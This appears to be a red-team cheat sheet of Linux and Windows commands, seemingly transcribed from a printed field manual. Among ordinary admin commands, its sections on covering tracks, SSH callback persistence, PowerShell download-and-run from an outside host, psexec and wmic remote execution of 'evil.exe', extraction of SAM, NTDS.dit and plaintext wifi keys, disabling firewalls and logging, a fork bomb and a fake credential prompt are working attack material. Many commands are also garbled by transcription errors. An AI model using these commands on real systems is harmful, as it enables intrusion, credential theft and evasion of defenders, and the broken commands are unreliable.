********************  Linux Networking Commands  ************************
watch ss -tp                                                   #Network connections
netstat -ant                                                   #Tcp connections -anu=udp
netstat -tulpn                                                 #Connections with PIDs
lsof -i                                                        #Established connections
smb:// ip /share                                               #Access windows smb share
share user x.x.x.x c$                                          #Mount Windows share
smbclient -U user\\\\ ip \\ share                              #SMB connect
ifconfig eth# ip / cidr                                        #Set IP and netmask
ifconfig eth0:l ip / cidr                                      #Set virtual interface
route add default gw gw ip                                     #Set GW
ifconfig eth# mtu [size]                                       #Change MTU size
export MAC=xx: XX: XX: XX: XX: XX                              #Change MAC
ifconfig int hw ether MAC                                      #Change MAC
macchanger -m MAC int                                          #Backtrack MAC changer
iwlist int scan                                                #Built-in wifi scanner
dig -x ip                                                      #Domain lookup for IP
host ip                                                        #Domain lookup for IP
host -t SRV service tcp.url.com                                #Domain SRV lookup
dig @ ip domain -t AXrR                                        #DNS Zone Xfer
host -1 domain namesvr                                         #DNS Zone Xfer
ip xfrm state list                                             #Print existing VPN keys
ip addr add ip / cidr aev ethO                                 #Adds 'hidden' interface
/var/log/messages | grep DHCP                                  #List DHCP assignments
tcpkill host ip and port port                                  #Block ip:port
echo "1" /proc/sys/net/ipv4/ip forward                         #Turn on IP Forwarding
echo "nameserver x.x.x.x" /etc/resolv.conf                     #Add DNS Server
arp -an                                                        #Print route table without dns lookup
traceroute -n <ip>                                             #Trace route without dns lookup
netstat -rn                                                    #Prints routing table without dns lookup?????



********************  Linux System Info  ************************
nbtstat -A ip                                                                        #Get hostname for ip
nbtstat -name                                                                        #Lists local NetBIOS names
id                                                                                   #Current username
w                                                                                    #Logged on users
who -a                                                                               #User information
last -a                                                                              #Last users logged on
ps -ef                                                                               #Process listing (top)
df -h                                                                                #Disk usage (free)
uname -a                                                                             #Kernel version/CPU info
mount                                                                                #Mounted file Systems
getent passwd                                                                        #Show list of users
PATH~$PATH:/home/mypath                                                              #Add to PATH variable
kill pid                                                                             #Kills process with pid
cat /etc/issue                                                                       #Show OS info
cat /etc/'release'                                                                   #Show OS version info
cat /proc/version                                                                    #Show kernel info
rpm --query -all                                                                     #Installed pkgs (Redhat)
rpm -ivh ' .rpm                                                                      #Install RPM (-e=remove)
dpkg -get-selections                                                                 #Installed pkgs (Ubuntu)
dpkg -I '.deb                                                                        #Install DEB (-r=remove)
pkginfo                                                                              #Installed pkgs (Solaris)
which tscsh/csh/ksh/bash                                                             #Show location of executable
chmod -50 tcsh/csh/ksh                                                               #Disable shell , force bash




********************  Linux Utility Commands  ************************
wget http:// url -0 url.txt -o /dev/null                                                     #Grab url
wget https://8.8.8.8 --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" -O - -o /dev/null --no-check-certificate

rdesktop -u <username> -p <Password> -d <domain> -n Windows7 -f -g 1920x1080 clipboard:PRIMARYCLIPBOARD ip         #Remote Desktop to ip
scp /tmp/file user@x.x.x.x:/tmp/file                                                         #Put file
scp user@<remoteip>:/tmp/file /tmp/file                                                      #Get file
useradd -m user                                                                              #Add user
passwd user                                                                                  #Change user password
rmuser unarne                                                                                #Remove user
script -a outfile                                                                            #Record shell : Ctrl-D stops
apropos subject                                                                              #Find related command
history                                                                                      #View users command history
! num                                                                                        #Executes line # in history
tar -xvfj file.tar                                                                           #Unpack a tar file bzip2(j)
tar -czvf <file>.tar.gz /original-file                                                       #Archive a gzip(z) file
encfs /cryptdir /tmp/cleartext                                                               #Temporarily unencrypts to /tmp/cleartext
python -c 'import pty;pty.spawn("/bin/bash")'                                                #Upgrades a nc shell to tty
openssl rand -base64 12                                                                      #generates a 12 charater random password   


********************  Linux File Commands  ************************
diff filel file2                                         #Compare files
rm -rf dir                                               #Force delete of dir
shred -f -u file                                         #Overwrite/delete file
touch -r <ref-file> file                                 #Matches ref_ file timestamp
touch -t YYYYMMDDHHSS file                               #Set file timestamp
fdisk -l                                                 #List connected drives
mount /dev/sda# /mnt/usbkey                              #mount USB key
md5sum -t file                                           #Compute md5 hash
echo -n "str" | md5sum                                   #Generate md5 hash
shalsum file                                             #SHAl hash of file
sort -u                                                  #Sort/show unique lines
grep -c ''str'' file                                     #Count lines w/ ''str''
tar cf file.tar files                                    #Create .tar from files
tar xf file.tar                                          #Extract .tar
tar czf file.tar.gz files                                #Create .tar.gz
tar xzf file.tar.gz                                      #Extract .tar.gz
tar cjf file.tar.bz2 files                               #Create .tar.bz2
tar xjf file.tar.bz2                                     #Extract .tar.bz2
gzip file                                                #Compress/rename file
gzip -d file.gz                                          #Decompress file.gz
upx -9 -o out.exe orig.exe                               #UPX packs orig.exe
zip -r zipname.zip \Directory\'                          #Create zip
dd skip=lOOO count=2000 bs=8 if=file of=file             #Cut block 1K-3K from file
split -b 9K \ file prefix                                #Split file into 9K chunks
awk 'sub("$"."\r")' unix.txt win.txt                     #Win compatible txt file
find -i -name file -type '.pdf                           #Find PDF files
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;    #Search for setuid files
dos2unix file                                            #Convert to ~nix format
file file                                                #Determine file type/info
chattr (+/-)i file                                       #Set/Unset immutable bit




********************  Linux Misc Commands  ************************
unset HISTFILE                                              #Disable history logging
ssh user@ ip arecord - | aplay -                            #Record remote mic
gee -o outfile myfile.c                                     #Compile C,C++
init 6                                                      #Reboot (0 = shutdown)
cat /etc/'syslog'.conf 1 grep -v "#"                        #List of log files
grep 'href=' file | cut -d"/" -f3 | grep url | sort -u      #Strip links in url.com
dd if=/dev/urandom of= file bs=3145728 count=lOO            #Make random 3MB file




********************  Linux Cover Your Tracks ***********************
echo "" /var/log/auth.log                                 #Clear auth.log file
echo '''' ~/.bash_history                                 #Clear current user bash history
rm ~/.bash history -rf                                    #Delete .bash_history file
history -C                                                #Clear current session history
export HISTFILESIZE=O                                     #Set historj max lines to 0
export HISTSIZE=O                                         #Set histroy max commands to 0
unset HISTFILE                                            #Disable history logging (need to logout to take effect)
kill -9 $$                                                #Kills current session
ln /dev/null -/.bash_history -sf                          #Permanently send all bash history commands to /dev/null
bash -c "exec -a <new name> <backdoor>"                   #starts a back door renaming it to a common process


******************** SSH Tricks  *****************************
ssh root@1.1.1.1 -v -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no" #SSH Masquerade
cat localfile.txt | ssh user@<ip> " cat > file"                                     #SSH file transfer
ssh -N -M -S /tmp/sshtgt1 user@1.1.1.1                                              #Creates a Control Socket at /tmp/sshtgt1
ssh -S /tmp/sshtgt1 -O forward user@1.1.1.1                                         #Creates an interractive session on target using existing sockets.
/usr/sbin/sshd -D -p 2222 -q -o "AllowTCPForwarding yes" -o "GatewayPorts yes"      #Createsssh server listening on a radom port ready for ssh tunnels 


********************  Linux Scripting  ************************
### PING SWEEP
for x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x | grep "64 b" | cut -d" "-f4 ips.txt; done


### AUTOMATED DOMAIN NAME RESOLVE BASH SCRIPT
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l};do
host $range.$ip | grep "name pointer" | cut -d" " -fS
done


###FORK BOMB (CREATES PROCESSES UNTIL SYSTEM "CRASHES")
: (){:|: & };:


###DNS REVERSE LOOKUP
for ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip | grep $ip dns.txt; done;


###IP BANNING SCRIPT
#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while [ $i -le 253 ]
do
if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
echo "BANNED: arp -s 192.168.1.$i"
arp -s 192.168.1.$i 00:00:00:00:00:0a
else
echo "IP NOT BANNED: 192.168.1.$i '''''''''."
echo "'''''''''''''''''''''''''" 
fi
i='expr $i +1'
done 


###SSH CALLBACK
Set up script in crontab to callback ever} X minutes. Highly recommend YOU
set up a generic user on red team computer (with no shell privs). Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Red teamer connects to target via a
local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS-4040
REMUSR-user
HOSTS="domainl.com domain2.com domain3.com"
for LIVEHOST in SHOSTS;
do
COUNT-S(ping -c2 $LVEHOST | grep 'received' | awk -F',' ' { print
$2 } ' | awk ' { print $1 } ')
if [[ $COUN7 -gt 0 ]] ; then
ssh -R ${REMLIS}:localhost:22 -i
"/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
fi




********************  IPTables  ************************
iptables-restore file                                                                #Restore iptables rules
iptables -L -v --line-numbers                                                        #List all iptables rules with affected and line numbers
iptables -F                                                                          #Flush all iptables rules
iptables -P INPUT/FORWARD/OUTPUT ACCEPT/REJECT/DROP                                  #Change default policy for rules that don't match rules
iptables -A INPUT -i interface -m state -state RELATED,ESTABLISHED -j ACCEPT         #Allow established connections on INPUT
iptables -D INPUT 7                                                                  #Delete 7th inbound rule
iptables -t raw -L -n                                                                #Increase throughput by turning off statefulness
iptables -P INPUT DROP                                                               #Drop all packets


### Allow SSH on port 22 outbound
iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT


###ALLOW ICMP OUTBOUND
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-tjpe echo-reply -j ACCEPT


###PORT FORWARD
echo "1" /proc/sys/net/lpv4/lp forward
#OR- sysctl net.ipv4.ip forward=1
iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d <pivotip> --dport 443 -to-destination <attk-ip>:443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s target subnet cidr -d <attackip> --dport 443 -to-source <pivotip>
iptables -t filter -I FORWARD 1 -j ACCEPT


###ALLOW ONLY 1.1.1. 0/24, PORTS 80,443 AND LOG DROPS TO /VAR/LOG/MESSAGES
iptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW -p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o eth0 -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED"
iptables -A LOGGING -j DROP




********************  UPDATE-RC.D ***********************
service --status-all                                           #[+] Service starts at boot
                                                               #[-] Service does not start
service service start                                          #Start a service
service service stop                                           #Stop a service
service service status                                         #Check status of a service
update-rc.d -f service remove                                  #Remove a service start up cmd
update-rc.d service defaults                                   #Add a start up service




********************  CHKconfig ***********************
chkconfig --list                                               #List existing services and run status
chkconfig service -list                                        #Check single service status
chkconfig service on [--level 3]                               #Add service [optional to add level at which service runs)
chkconfig service off [--level 3]                              #Remove service




********************  X11 ***********************
###Capture remote X11 window and convert to jpg
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg


###Open X11 stream viewing
xwd -display 1.1.1.1:0 -root -silent -out x11dump             #Read dumped file with xwudtopnm or GIMP




********************  TCPDump ***********************
tcpdump -i ethO -XX -w out.pcap                                                     #CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
tcpdump -i ethO port 80 dst 2.2.2.2                                                 #CAPTURE HTTP TRAFFIC TO 2.2.2.2
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24                   #SHOW CONNECTIONS TO A SPECIFIC IP
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'                                  #PRINT ALL PING RESPONSES
tcpdump -i ethO -c 50 -tttt 'udp and port 53'                                       #CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
file2cable -i ethO -f file.pcap                                                     #Replay Pcap
tcpreplay --topspeed --loop=O --intf=ethO .pcap_file_to replay mbps=l0|100|1000     #Replay packet DOS




********************  Additional Kali Commands ***********************
#WMIC EQUIVALENT
wmis -U DOMAIN\ user % password // DC cmd.exe /c command


###MOUNT SMB SHARE
mount.cifs // ip /share /mnt/share -o user= user ,pass= pass ,sec=ntlmssp,domain= domain ,rw        # Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs

enum4linux <IP>                                                                 #A very detailed remote SMB enumeration 
/usr/share/doc/python-impacket/examples/psexec.py domain/user:'password'@<ip>   #psexec but cleaner
winexe -U domain.name/username //ip C:\\windows\\bad.exe --system               #Executes Bad.exe on remote windows box.

********************  PFSense ***********************
pfSsh.php                                                   #pfSense Shell System
pfSsh.php playback enableallowallwan                        #Allow all inbound WAN connections (adds to visible rules in WAN rules)
pfSsh.php playback enablesshd                               #Enable ssh inbound/outbound
pfctl -sn                                                   #Show NAT rules
pfctl -sr                                                   #Show filter rules
pfctl -sa                                                   #Show all rules
pfctl -d                                                    #Disables all rules
pfctl -e                                                    #Enables all rules
viconfig                                                    #Edit config
rm /tmp/config.cache                                        #Remove cached (backup) config after editing the current running
/etc/rc.reload_all                                          #Reload entire config




********************  Windows Versions ***********************
NT 3.1             #Windows NT 3.1 (All)
NT 3.5             #Windows NT 3.5 (All)
NT 3.51            #Windows NT 3.51 (All)
NT 4.0             #Windows NT 4.0 (All)
NT 5.0             #Windows 2000 (All)
NT 5.1             #Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
NT 5.2             #Windows XP 64-bit, Server 2003 & R2, Windows Home Server
NT 6.0             #Windows Vista, Server 2008
NT 6.1             #Windows 7, Server 2008 R2
NT 6.2             #Windows 8, Windows Server 2012
NT 6.3             #Windows 8.1, Windows Server 2012 R2
NT 10              #Windows 10, Windows Server 2016



********************  Windows Files ***********************
%SYSTEMROOT%                                             #Typically C:\Windows
%SYSTEMROOT%\System32\drivers\etc\hosts                  #DNS entries
%SYSTEMROOT%\System32\drivers\etc\networks               #Network settings
%SYSTEMROOT%\system32\config\SAM                         #User & password hashes
%SYSTEMROOT%\repair\SAM                                  #Backup copy of SAM
%SYSTEMROOT%\System32\config\RegBack\SAM                 #Backup copy of SAM
%WINDIR%\system32\config\AppEvent.Evt                    #Application Log
%WINDIR%\system32\config\SecEvent.Evt                    #Security Log
%ALLUSERSPROFILE%\Start Menu\Programs\Startup\           #Startup Location
%USERPROFILE%\Start Menu\Programs\Startup\               #Startup Location
%SYSTEMROOT%\Prefetch                                    #Prefetch dir (EXE logs)
C:\windows\system32\drivers\etc\hosts                    #Checks here before a dns request is sent


********************  Startup Directory ***********************
###Windows NT 6.1,6.0
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                             # All users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup        # Specific users


###Windows NT 5.2, 5.1, 5.0
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup




********************  Windows System Info Commands ***********************
version                                                                            #Get OS version
systeminfo                                                                         #enumerates basic system info
sc query state=all                                                                 #Show services
tasklist /svc                                                                      #Show processes & services
tasklist /m                                                                        #Show all processes & DLLs
tasklist /S ip /v                                                                  #Remote process listing
taskkill /PID <pid> /F                                                             #Force process to terminate
systeminfo /S ip /U domain\user /P Pwd                                             #Remote system info
reg query\\ ip \ RegDomain \ Key /v Value                                          #Query remote registry, /s=all values
reg query HKLM /f password /t REG_SZ /s                                            #Search registry for password
fsutil fsinfo drives                                                               #List drives •must be admin
dir /a /s /b c:\'.pdf'                                                             #Search for all PDFs
dir /a /b c:\windows\kb'                                                           #Search for patches
findstr /si password' .txt | '.xml |.xls                                           #Search files for password
tree /F /A c:\ tree.txt                                                            #Directory listing of C:
reg save HKLM\Security security.hive                                               #Save security hive to file
echo %USERNAME%                                                                    #Current user
type <file>                                                                        #View contents of a file
Get-WindowsDriver -Online -ALL                                                     #List all loaded drivers
Get-ChildItem | Select-Object name,CreationTime,LastAccessTime,LastWriteTime       #lists mac timestamp
wmic process get commandline,processid, parentprocessid /format:list               #lists process name, pid and ppid





********************  Windows Net/Domain Commands ***********************
net view /domain                                                #Hosts in current domain
net view /domain: [MYDOMAIN]                                    #Hosts in [MYDOMAIN]
net user /domain                                                #All users in current domain
net user user pass /add                                         #Add user
net localgroup "Administrators" user /add                       #Add user to Administrators
net accounts /domain                                            #Domain password policy
net localgroup "Administrators"                                 #List local Admins
net group /domain                                               #List domain groups
net group "Domain Admins" /domain                               #List users in Domain Admins
net group "Domain Controllers" /domain                          #List DCs for current domain
net share                                                       #Current SMB shares
net session / find / "\\"                                       #Active SHB sessions
net user user /ACTIVE:yes /domain                               #Unlock domain user account
net user user " newpassword " /domain                           #Change domain user password
net share share c:\share /GRANT:Everyone,FULL                   #Share folder
net start telnet                                                #Starts telnet, however the service must first be enabled


********************  Windows Remote Commands ***********************
tasklist /S ip /v                                                                    #Remote process listing
systeminfo /S ip /U domain\user /P Pwd                                               #Remote systeminfo
net share \\ ip                                                                      #Shares of remote computer
net use \\ ip                                                                        #Remote filesystem (IPC$)
net use z: \\ ip \share password /user: DOMAIN\ user                                 #Map drive, specified credentials
reg add \\ ip \ regkey \ value                                                       #Add registry key remotely
sc \\ ip create service        binpath=C:\Windows\System32\x.exe start= auto         #Create a remote service (space after start=)
xcopy /s \\ ip \dir C:\local                                                         #Copy remote folder
shutdown /m \\ ip /r /t 0 /f                                                         #Remotely reboot machine




********************  Windows Network Commands ***********************
ipconfig / all                                                       #IP configuration
ipconfig /displaydns                                                 #Local DNS cache
netstat -ano                                                         #Open connections
netstat -anop tcp 1                                                  #Netstat loop
netstat -an | findstr LISTENING                                      #LISTENING ports
route print                                                          #Routing table
ipconfig /displaydns                                                 #dns cashe
arp -a                                                               #Known MACs (ARP table)
nslookup, set type=any, ls -d domain results.txt, exit               #DNS Zone Xfer
nslookup -type=SRV _www._tcp.url.com                                 #Domain SRV lookup ( ldap, kerberos, sip)
tftp -I ip GET remotefile                                            #TFTP file transfer
netsh wlan show profiles                                             #Saved wireless profiles
netsh firewall set opmode disable                                    #Disable firewall ('Old)
netsh wlan export profile folder=. key=clear                         #Export wifi plaintext pwd
netsh interface ip show interfaces                                   #List interface IDs/MTUs
netsh interface ip set address local static ip nmask gw ID           #Set IP
netsh interface ip set dns local static ip                           #Set DNS server
netsh interface ip set address local dhcp                            #Set interface to use DHCP




********************  Windows Utility Commands ***********************
type file                                                            #Display file contents
del path\' .' /a /s /q /f                                            #Forceably delete all files in path
find /I "str" filename                                               #Find "str"
command | find /c /v ""                                              #Line count of cmd output
at HH:Ml1 file [args] (i.e. at 14:45 cmd /c)                         #Schedule file to run
runas /user: user " file [args] "                                    #Run file as user
restart /r /t 0                                                      #Restart now
tr -d '\15\32' win.txt unix.txt                                      #Removes CR & 'Z ('nix)
makecab file                                                         #Native compression
Wusa.exe /uninstall /kb: ###                                         #Uninstall patch
cmd.exe "wevtutil qe Application /c:40 /f:text /rd:true"             #CLI Event Viewer
lusrrngr.rnsc                                                        #Local user manager
services.msc                                                         #Services control panel
taskmgr.exe                                                          #Task manager
secpool.msc                                                          #Security policy manager
eventvwr.msc                                                         #Event viewer
type c:\anyfile.exe > c:\winnt\system32\calc.exe:anyfile.exe         #Sets ADS
star c:\winnt\system32\calc.exe:anyfile.exe                          #executes an ADS
Taskkill /PID <26356> /F                                             #Kill a process
wevtutil el | Foreach-Object {wevtutil cl "$_"}                      #clear all logs


********************  Windows Netsh Commands **********************
netsh advfirewall firewall show rule name=all                                                                                           #Shows all firewall rules
netsh advfirewall rule name="SQL Server" dir=in action=allow protocol=tcp localport=5555 enable=yes profile=any                         #Poke hole in firewall 
netsh interface portproxy add v4tov4 listen port=4444 listenaddress=<thisboxIP> connectport=22 connectaddress=<T2IP> protocol=tcp       #Port Forwarding
netsh advfirewall set currentprofile state off                                                                                          #Turns all firewalls off, Win 7 and up
netsh advfirewall set allprofiles state off                                                                                             #Turns Current firewall off, Win 7 and up


********************  Windows Misc. Commands ***********************
###LOCK WORKSTATION
rundll32.dll user32.dll LockWorkstation


###NATIVE WINDOWS PORT FORWARD ( * MUST BE ADMIN)
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l


###RE-ENABLE COMMAND PROMPT
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f




********************  PSexec ***********************
###EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS
psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe


###RUN REMOTE COMMAND WITH SPECIFIED HASH
psexec /accepteula \\ ip -u Domain\user -p LM : NTLM cmd.exe /c dir c:\Progra~1


###RUN REMOTE COMMAND AS SYSTEM
psexec /accepteula \\ ip -s cmd.exe




********************  Terminal Services (RDP) ***********************
###Start RDP
1. Create regfile.reg file with following line in it:
HKEY LOCAL MACHINE\SYSTEM\CurrentControlSet \Control\TerminalService
2. "fDenyTSConnections"=dword: 00000000
3. reg import reg file. reg
4. net start "terrnservice"
5. sc config termservice start= auto
6. net start termservice
--OR--
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


###TUNNEL RDP OUT PORT 443 (MAY NEED TO RESTART TERMINAL SERVICES)
REG ADD "HKLM\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f


###DISABLE NETWORK LEVEL AUTHENTICATION, ADD FIREWALL EXCEPTION
reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
netsh firewall set service type = remotedesktop mode = enable


###IMPORT A SCHEDULE TASK FROM AN "EXPORTED TASK" XML
schtasks.exe /create /tn MyTask /xml "C:\MyTask.xml" /f




********************  WMIC ***********************
wmic [alias] get /?                                     #List all attributes
wmic [alias] call /?                                    #Callable methods
wmic process list full                                  #Process attributes
wmic startupwmic service                                #Starts wmic service
wmic ntdomain list                                      #Domain and DC info
wmic qfe                                                #List all patches
wmic process call create "process name"                 #Execute process
wmic process where name="process" call terminate        #Terminate process                                                                        #
wmic logicaldisk get description,name                   #View logical shares
wmic cpu get DataWidth /format:list                     #Display 32 I I 64 bit


###WMIC [ALIAS] [WHERE] [CLAUSE]
[alias] == process, share, startup, service, nicconfig, useraccount, etc.
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc.
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method],delete


###EXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS
wmic /node: targetiP /user:domain\user /password:password process call create "\\ smbiP \share\evil.exe"


###UNINSTALL SOFTWARE
wmic product get name /value                                                                         # Get software names
wmic product where name="XXX" call uninstall /nointeractive


###REMOTELY DETERMINE LOGGED IN USER
wmic /node:remotecomputer computersystern get username


###REMOTE PROCESS LISTING EVERY SECOND
wmic /node:machinename process list brief /every:l


###REMOTELY START RDP
wmic /node:"machinename 4" path Win32_TerminalServiceSetting where AllowTSConnections="O" call SetAllowTSConnections "1"


###LIST NUMBER OF TIMES USER HAS LOGGED ON
wmic netlogin where (name like "%adm%") get numberoflogons


###SEARCH FOR SERVICES WITH UNQUOTED PATHS TO BINARY
wmic service get name,displayname,pathname,startrnode | findstr /i "auto"
| findstr /i /v "C:\windows\\" lfindstr /i /v """


###VOLUME SHADOW COPY
1. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c vssadmin list shadows 2 &1 c:\temp\output.txt"
#If any copies already exist then exfil, otherwise create using
following commands. Check output.txt for any errors
2. wmic /node: DC IP /user:"D0MAIN\user" /password:"PASS" process call create "cmd /c vssadmin create shadow /for=C: 2 &1 C:\temp\output.txt"
3. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive 2 &1 C:\temp\output.txt"
4. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit C:\temp\ntds.dit 2&1 C:\temp\output.txt"
Step by step instructions on room362.com for step below
5. From Linux, download and run ntdsxtract and libesedb to export hashes or other domain information
a. Additional instructions found under the VSSOWN section
b. ntdsxtract- http://www.ntdsxtract.com
c. libesedb- http://code.google.com/p/libesedb/




********************  Powershell ***********************
powershell.exe -nop -exec bypass                                    #start powershell
$psversiontable.psversion                                           #displays powershell version
set-executionpolicy unrestricted                                    #allows execution of any scritp
stop-transcript                                                     #Stops recording
get-content file                                                    #displays file contents
get-help command -examples                                          #Shows examples of command
get-command ' string '                                              #Searches for cmd string
get-service                                                         #Displays services (stopservice, start-service)
get-wmiobject -class win32_service                                  #Display powershell version
$PSVesionTable                                                      #Run powershell 2.0 from 3.0
powershell.exe -version 2.0                                         #Returns # of services
get-service measure-object                                          #Returns list of PSDrives
get-psdrive                                                         #Returns only names
get-process select -expandproperty name                             #Cmdlets that take creds
get-help ' -parameter credential                                    #Available WMI network cmds
get-wmiobject -list -'network (Net.DNS]: :GetnostEntry(" ip")       #DNS Lookup
Get-FileHash <file> -Algorithm MD5                                  #Hash a file
get-process -id <pid> | select -expand modules                      #list process dlls
Get-ChildItem -path C:\Windows | Select-Object name, lastaccesstime, lastwritetime, creationtime | Sort-Object -Property lastwritetime | format-table -AutoSize     #file time stamps
Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }                           #liost files changed in last 2 hours
$tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'  #schtasks to run
Get-wmiobject win32_service | where-object { $_.StartMode -eq 'Auto' } | format-list Name, DisplayName, PathName                                                    #Services
get-winevent @{logname='application','security','system';starttime=[datetime]::today} | select logname, timecreated, id, message | formate-table -autosize          #Check event logs
get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Detect" | Select-Object lastsuccesstime                         #last time windows updated
get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"                                                                               # Windows Env variables
get-itemproperty "HKCU:\network\*"                                                                                                                                  #list shares
auditpol /get /catagory:*                                                                                                                                           #lists audit polocies
IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1")                                                                                 #download script to memory
import-module c:\windows\system32\config\mslog.ps1                                                                                                                  #ingest script into memory

###DISABLE POWERSHELL LOGGING%%
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableTranscripting = 1   # is on
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableInvocationHeader = 1
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription OutputDirectory = “”

###Check for Powershell logs
wevtutil el
wevtutil gl "Windows Powershell"
wevtutil sl "Windows Powershell" /ms:1024000
wevtutil sl "windows Powershell" /rt:true /ab:fales
wevtutil sl "windows Powershell" /ab:false



###CLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(SVROl)
Get-EventLog -list Clear-EventLog -logname Application, Security -computername SVR01


###EXPORT OS INFO INTO CSV FILE
Get-WmiObject -class win32 operatingsjstem I select -property 1 1 exportcsv c:\os.txt


###LIST RUNNING SERVICES
Get-Service | where object {$ .status -eq "Running"}


###PERSISTENT PSDRIVE TO REMOTE FILE SHARE:
New-PSDrive -Persist -PSProvider FileSystem -Root \\1.1.1.1\tools -Name i


###RETURN FILES WITH WRITE DATE PAST 8/20
Get-Childitem -Path c:\ -Force -Recurse -Filter '.log -ErrorAction SilentlyContinue | where {$ .LastWriteTime -gt "2012-08-20"}


###FILE DOWNLOAD OVER HTTP
(new-object system.net.webclient) .downloadFile("url","dest")


###TCP PORT CONNECTION (SCANNER)
$ports=(#,#,#);$ip="x.x.x.x";foreach ($port in $ports) {try($socket=Newobject
System.Net.Sockets.TCPClient($ip,$port); }catch{};if ($socket -eq
$NULL} {echo $ip":"$port"- Closed";}else{echo $ip":"$port" - Open";$socket
= $NULL;}}


###PING WITH 500 MILLISECOND TIMEOUT
$ping = New-Object System.Net.Networkinformation.ping
$ping.Send(" ip ",55O)


###BASIC AUTHENTICATION POPUP
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
$Host.UI.PromptForCredential(" title ", " message","user" " domain")


###RUN EXE EVERY 4 HOURS BETWEEN AUG 8-11 , 2 013 AND THE HOURS OF 0800-1700 (FROM CMo. EXE)
powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match
'201308(0[8-9]|1[0-1])-(0[8-9]|1[0-7]) [ 0-5] [ 0-9]') {Start-Process -
WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400}}while(1)"


###POWERSHELL RUNAS
$pw = convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp = new-object -typename System.Management.Automation.PSCredential -
argument list "DOMAIN\user", $pw;
